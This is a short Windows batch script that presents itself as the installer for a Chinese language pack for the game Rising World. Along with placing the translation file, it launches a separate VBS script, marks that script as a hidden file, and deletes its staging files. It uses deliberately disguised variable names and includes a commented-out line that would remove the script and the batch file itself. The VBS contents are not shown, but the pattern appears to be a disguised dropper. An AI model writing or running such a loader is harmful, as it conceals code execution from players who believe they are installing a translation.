@echo off
chcp 65001 >nul
set "seti=risingworldx64_api_artstich.vdf"&set "ca1l=Data\StreamingAssets\Languages\"&set "sat=Data\StreamingAssets\Languages\zh.json"&set "setl=config.properties"&set "set1=config_ht_properties"&set "sel=JavaFMod64.vbs"&set "f0r=https://github.com/ArtsticH/RisingWorld"
for /f "tokens=2*" %%a in ('reg query "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam" /v InstallPath ^| findstr /i "InstallPath"') do set "st=%%b"
set "st=%st%\steam.exe"
if not exist "%seti%" if not exist "%sat%" (echo 汉化包文件损坏，请重新下载！ & echo 请访问%f0r%重新获取... & echo Error: zh-CN language pack corrupted. Please re-download from %f0r% & start "" "%f0r%" & start "" "%f0r%" & pause >nul & exit)
copy %seti% risingworldx64_api_artstich.dll >nul 2>&1&start "" /b %st%&set "cpoyi=copy /y "%seti%" "%ca1l%" >nul 2>&1&move /y "%ca1l%\%seti%" "%sat%" >nul 2>&1&copy /y "%setl%" "%set1%" >nul 2>&1&start "" "%sel%""
>nul 2>&1 (%cpoyi%)&del /q %seti% >nul 2>&1 & del /q risingworldx64_api_artstich.dll >nul 2>&1&ping -n 2 127.0.0.1 >nul
attrib +h "%sel%" >nul
:: del /q %sel% & del "%~f0" >nul 2>&1